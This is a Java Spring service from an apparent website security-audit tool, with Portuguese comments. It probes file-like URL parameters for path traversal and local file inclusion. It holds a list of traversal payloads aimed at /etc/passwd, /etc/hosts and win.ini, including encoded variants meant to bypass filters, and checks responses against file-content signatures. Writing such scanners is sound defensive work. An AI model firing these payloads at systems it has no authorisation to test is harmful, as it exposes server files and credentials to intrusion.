package com.joao.cyberaudit.service;

import com.joao.cyberaudit.model.PathTraversalFinding;
import org.springframework.stereotype.Service;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Set;

@Service
public class PathTraversalService {

    /**
     * Nomes de parametros tipicamente usados para incluir arquivos.
     * Limite conservador: evita testar parametros genericos como "id" ou "q"
     * que raramente sao vulneraveis a path traversal.
     */
    private static final Set<String> FILE_PARAMS = Set.of(
            "file", "page", "path", "template", "include", "doc",
            "view", "load", "source", "content", "module", "layout"
    );

    /**
     * Payloads testados em ordem de prioridade.
     * Mistura tecnicas para burlar filtros simples:
     * - Traversal classico Unix
     * - Double-encoding parcial (%2F, %5C)
     * - Obfuscacao com barras duplicadas (....// = ..//)
     * - Traversal Windows com backslash
     */
    private static final List<String[]> PAYLOADS = List.of(
            // { payload_raw, target_descricao, os }
            new String[]{ "../../../etc/passwd",            "/etc/passwd",      "unix" },
            new String[]{ "../../../../etc/passwd",         "/etc/passwd",      "unix" },
            new String[]{ "../../../../../etc/passwd",      "/etc/passwd",      "unix" },
            new String[]{ "....//....//....//etc/passwd",   "/etc/passwd",      "unix" },
            new String[]{ "../../../etc/hosts",             "/etc/hosts",       "unix" },
            new String[]{ "..%2F..%2F..%2Fetc%2Fpasswd",   "/etc/passwd",      "unix" },
            new String[]{ "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/etc/passwd", "unix" },
            new String[]{ "..\\..\\..\\windows\\win.ini",  "windows/win.ini",  "win"  },
            new String[]{ "..\\..\\..\\..\\windows\\win.ini", "windows/win.ini","win" },
            new String[]{ "..%5C..%5C..%5Cwindows%5Cwin.ini", "windows/win.ini","win" }
    );

    /**
     * Assinaturas de conteudo que confirmam vazamento do arquivo alvo.
     * Anti-FP: exige multiplas strings presentes simultaneamente.
     */
    private static final List<String[]> SIGNATURES = List.of(
            // { target, marker1, marker2 }
            new String[]{ "/etc/passwd",    "root:",        "/bin/" },
            new String[]{ "/etc/passwd",    "root:x:0:0",   null    },
            new String[]{ "/etc/hosts",     "127.0.0.1",    "localhost" },
            new String[]{ "windows/win.ini","[fonts]",      null    },
            new String[]{ "windows/win.ini","[extensions]", null    },
            new String[]{ "windows/win.ini","[mci",         null    }
    );

    private final HttpClient client = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.NEVER)  // nao seguir redirects — LFI raramente redireciona
            .connectTimeout(Duration.ofSeconds(5))
            .build();

    /**
     * Testa path traversal / LFI nos parametros file-like da URL.
     * So executa se a URL contem query string (inputSurfaceDetected = true).
     *
     * @param urlWithParams  URL completa com query string
     * @return lista de findings (normalmente 0 ou 1 — para na primeira confirmacao por param)
     */
    public List<PathTraversalFinding> scan(String urlWithParams) {
        List<PathTraversalFinding> findings = new ArrayList<>();
        if (urlWithParams == null || !urlWithParams.contains("?")) return findings;

        // Extrai pares chave=valor da query string
        int q     = urlWithParams.indexOf('?');
        String base  = urlWithParams.substring(0, q);
        String query = urlWithParams.substring(q + 1);

        String[] pairs = query.split("&");
        for (String pair : pairs) {
            String[] kv  = pair.split("=", 2);
            String   key = kv[0].trim().toLowerCase(Locale.ROOT);

            if (!FILE_PARAMS.contains(key)) continue;

            // Testa payloads para este parametro ate encontrar confirmacao
            PathTraversalFinding finding = probeParam(base, query, kv[0], pairs);
            if (finding != null) {
                findings.add(finding);
                // Nao continua testando o mesmo parametro apos confirmacao
            }
        }

        return findings;
    }

    private PathTraversalFinding probeParam(String base, String originalQuery,
                                             String paramName, String[] allPairs) {
        for (String[] payloadEntry : PAYLOADS) {
            String payloadRaw    = payloadEntry[0];
            String targetDesc    = payloadEntry[1];

            // Monta query substituindo apenas o parametro alvo
            String mutatedQuery = replaceParamValue(allPairs, paramName, payloadRaw);
            String url = base + "?" + mutatedQuery;

            try {
                HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                        .GET()
                        .timeout(Duration.ofSeconds(10))
                        .header("User-Agent", ScannerHttp.USER_AGENT)
                        .header("Accept", "text/html,text/plain,*/*")
                        .build();

                HttpResponse<String> resp = client.send(req, ScannerHttp.limitedString());
                if (resp.statusCode() != 200) continue;

                String body = resp.body() == null ? "" : resp.body();

                String evidence = matchesFileContent(body, targetDesc);
                if (evidence != null) {
                    return PathTraversalFinding.builder()
                            .parameter(paramName)
                            .payload(payloadRaw)
                            .target(targetDesc)
                            .evidence(evidence)
                            .severity("CRITICAL")
                            .build();
                }
            } catch (Exception ignored) {}
        }
        return null;
    }

    /**
     * Verifica se o body contem assinaturas do arquivo alvo.
     * Retorna um snippet de evidencia (max 120 chars) ou null se nao confirmado.
     */
    private String matchesFileContent(String body, String target) {
        String lower = body.toLowerCase(Locale.ROOT);

        for (String[] sig : SIGNATURES) {
            String sigTarget  = sig[0];
            String marker1    = sig[1];
            String marker2    = sig[2];

            if (!target.equals(sigTarget)) continue;

            if (!lower.contains(marker1.toLowerCase(Locale.ROOT))) continue;
            if (marker2 != null && !lower.contains(marker2.toLowerCase(Locale.ROOT))) continue;

            // Extrai snippet centrado no marcador primario
            int idx = lower.indexOf(marker1.toLowerCase(Locale.ROOT));
            int start = Math.max(0, idx - 10);
            int end   = Math.min(body.length(), idx + 80);
            return body.substring(start, end).replaceAll("[\\r\\n\\t]+", " ").trim();
        }
        return null;
    }

    /**
     * Reconstroi a query string substituindo o valor de um parametro especifico.
     * Usa encode manual para preservar o payload exato (incluindo %2F, %5C etc).
     */
    private String replaceParamValue(String[] pairs, String targetKey, String newValue) {
        StringBuilder sb = new StringBuilder();
        for (String pair : pairs) {
            if (sb.length() > 0) sb.append('&');
            String[] kv = pair.split("=", 2);
            if (kv[0].equalsIgnoreCase(targetKey)) {
                sb.append(kv[0]).append('=').append(encodePayload(newValue));
            } else {
                sb.append(pair);
            }
        }
        return sb.toString();
    }

    /**
     * Encoda o payload preservando sequencias de encoding ja presentes.
     * Payloads com %2F, %5C etc nao devem ter o % re-encodado.
     */
    private String encodePayload(String payload) {
        // Se o payload ja tem % encoding, enviamos raw (o servidor vai decodar)
        if (payload.contains("%")) return payload;
        return URLEncoder.encode(payload, StandardCharsets.UTF_8)
                .replace("%2F", "/")   // barras em traversal devem chegar ao servidor
                .replace("%5C", "\\"); // backslashes tambem
    }
}
